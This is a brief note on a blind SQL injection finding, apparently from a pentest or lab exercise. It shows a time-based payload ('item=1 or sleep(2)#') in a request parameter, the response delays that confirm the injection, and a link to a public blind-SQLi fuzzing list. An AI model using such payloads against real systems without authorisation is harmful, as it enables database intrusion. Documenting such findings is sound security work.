# SQL Injection (Blind)

Payload: `item=1&search=`
Response Time: 5ms

Payload: `item=1 or sleep(2)#&search=`
Response Time: 18000 ms


## References:
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/SQLi/Generic-BlindSQLi.fuzzdb.txt
